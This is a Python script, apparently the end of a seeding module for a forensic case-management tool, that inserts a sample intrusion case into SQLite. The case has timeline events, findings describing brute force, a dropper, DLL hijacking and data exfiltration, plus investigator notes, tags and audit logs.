        ("2026-10-01 10:30:00", "Acquisition", "Physical Drive Triage Image Acquired", "Forensic bitstream triage image collected using Tableau write blocker.", "Investigation", "EVD-001", "hard-drive"),
        ("2026-10-01 10:32:00", "Integrity Check", "SHA-256 Baseline Hashes Verified", "All acquired evidence verified against cryptographic hash database.", "Investigation", "EVD-001", "check-square"),
        ("2026-10-01 11:00:00", "Forensic Review", "Investigator Initial Case Assessment", "Lead investigator Vance confirmed multi-stage intrusion and exfiltration vector.", "Investigation", None, "file-check")
    ]
    for ts, ev_type, title, desc, cat, ev_ref, icon in timeline_sample:
        cursor.execute('''
            INSERT INTO timeline_events (
                case_id, evidence_id, timestamp, event_type, title, description, category, source_ref, icon
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            case_id, ev_id_map.get(ev_ref), ts, ev_type, title, desc, cat,
            f"Evidence {ev_ref}" if ev_ref else "Incident Response Ledger", icon
        ))

    # 7. Seed 4 Formal Investigation Findings
    findings_sample = [
        {
            "num": "FND-001",
            "title": "Initial Reconnaissance and External Credential Compromise",
            "desc": "External threat actor operating from IP 194.26.29.112 conducted automated vulnerability scanning against DMZ gateways, subsequently executing brute-force attacks against SSH services and successfully logging into bastion host with compromised service credentials.",
            "sev": "High",
            "status": "Validated",
            "basis": "Nginx web access logs (EVD-007) and bastion /var/log/auth.log (EVD-013) demonstrate concurrent IP source 194.26.29.112.",
            "ev_ids": json.dumps([ev_id_map.get("EVD-007"), ev_id_map.get("EVD-013")]),
            "ind_ids": json.dumps([1, 5])
        },
        {
            "num": "FND-002",
            "title": "Malicious Dropper Execution via User Temp Directory",
            "desc": "Anomalous executable 'updater.exe' (EVD-002) was delivered via masqueraded CDN domain, exhibiting a high Shannon entropy score of 7.82. Binary was executed via an obfuscated, base64-encoded PowerShell command.",
            "sev": "Critical",
            "status": "Validated",
            "basis": "File metadata analysis confirms anomalous directory staging, PE header entropy > 7.5, and matching PowerShell execution transcripts.",
            "ev_ids": json.dumps([ev_id_map.get("EVD-002"), ev_id_map.get("EVD-005"), ev_id_map.get("EVD-006")]),
            "ind_ids": json.dumps([2, 7])
        },
        {
            "num": "FND-003",
            "title": "Persistence Mechanism via DLL Search Order Hijacking",
            "desc": "Threat actor dropped crafted DLL 'apphelp.dll' into user's OneDrive directory (EVD-012) to achieve persistence across system reboots by exploiting standard Windows DLL loading search order.",
            "sev": "High",
            "status": "Validated",
            "basis": "Non-standard DLL location discovered in OneDrive directory alongside execution timestamps following initial payload execution.",
            "ev_ids": json.dumps([ev_id_map.get("EVD-012")]),
            "ind_ids": json.dumps([8])
        },
        {
            "num": "FND-004",
            "title": "Confidential Financial Data Staging and Exfiltration",
            "desc": "Adversary located sensitive corporate files including Q3 financial forecasts and employee compensation records, compiled them into password-protected archive 'fin_q3.zip', and transmitted the package to public file-sharing service temp-storage-drop.io.",
            "sev": "Critical",
            "status": "Validated",
            "basis": "Correlated browser navigation timestamps with firewall egress telemetry and recovered deleted zip container from Recycle Bin artifacts.",
            "ev_ids": json.dumps([ev_id_map.get("EVD-003"), ev_id_map.get("EVD-011"), ev_id_map.get("EVD-015"), ev_id_map.get("EVD-008")]),
            "ind_ids": json.dumps([3, 4, 9])
        }
    ]
    for f in findings_sample:
        cursor.execute('''
            INSERT INTO findings (
                case_id, finding_number, title, description, severity, status,
                investigator, explainable_basis, evidence_ids, indicator_ids, timeline_ids, created_at
            ) VALUES (?, ?, ?, ?, ?, ?, 'Senior Investigator Alex Vance', ?, ?, ?, '[]', '2026-10-01 11:30:00')
        ''', (
            case_id, f["num"], f["title"], f["desc"], f["sev"], f["status"],
            f["basis"], f["ev_ids"], f["ind_ids"]
        ))

    # 8. Seed Investigator Notes & Tags
    notes_sample = [
        {"type": "case", "id": case_id, "author": "Senior Investigator Alex Vance", "content": "Initial scope confirmed to executive workstation WS-FIN-09. All disk and memory images preserved with SHA-256 verification."},
        {"type": "evidence", "id": ev_id_map.get("EVD-002"), "author": "Analyst Sarah Connor", "content": "Static analysis indicates packed UPX stub with custom obfuscated import table. Sample isolated in quarantine vault."},
        {"type": "evidence", "id": ev_id_map.get("EVD-011"), "author": "Senior Investigator Alex Vance", "content": "Recovered from Recycle Bin cluster index $R5A2X01. Archive contents matched modified timestamps of targeted financial files."},
        {"type": "finding", "id": 1, "author": "Lead Examiner Vance", "content": "Shared IOC telemetry with internal Threat Intel unit to block 194.26.29.112 across global enterprise borders."}
    ]
    for n in notes_sample:
        cursor.execute('''
            INSERT INTO notes (case_id, target_type, target_id, author, content, created_at)
            VALUES (?, ?, ?, ?, ?, '2026-10-01 11:45:00')
        ''', (case_id, n["type"], n["id"], n["author"], n["content"]))

    # Tags
    tags_sample = [
        ("case", case_id, "Active Incident"),
        ("case", case_id, "Data Exfiltration"),
        ("evidence", ev_id_map.get("EVD-002"), "Suspicious"),
        ("evidence", ev_id_map.get("EVD-002"), "Executable"),
        ("evidence", ev_id_map.get("EVD-005"), "Browser"),
        ("evidence", ev_id_map.get("EVD-008"), "Network"),
        ("evidence", ev_id_map.get("EVD-011"), "Important"),
        ("evidence", ev_id_map.get("EVD-011"), "Related Evidence")
    ]
    for target_type, target_id, tag_name in tags_sample:
        cursor.execute('''
            INSERT INTO tags (case_id, target_type, target_id, tag_name)
            VALUES (?, ?, ?, ?)
        ''', (case_id, target_type, target_id, tag_name))

    # Audit Logs
    audit_sample = [
        ("investigator", "Case Created", "case", case_id, "Initialized case FL-2026-001"),
        ("investigator", "Evidence Added", "evidence", ev_id_map.get("EVD-001"), "Imported disk image triage"),
        ("investigator", "Evidence Analyzed", "evidence", ev_id_map.get("EVD-002"), "Extracted metadata and executed heuristic analysis"),
        ("investigator", "Finding Created", "finding", 1, "Recorded finding FND-001 Initial Reconnaissance"),
        ("investigator", "Timeline Generated", "case", case_id, "Normalized 32 timeline events from evidence sources")
    ]
    for u, act, otype, oid, det in audit_sample:
        cursor.execute('''
            INSERT INTO audit_logs (case_id, username, action, object_type, object_id, details, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, '2026-10-01 12:00:00')
        ''', (case_id, u, act, otype, oid, det))

    conn.commit()
    return case_id

if __name__ == "__main__":
    conn = sqlite3.connect("forensix.db")
    conn.row_factory = sqlite3.Row
    c_id = seed_sample_case(conn)
    conn.close()
    print(f"Sample forensic case FL-2026-001 seeded successfully with ID {c_id}.")
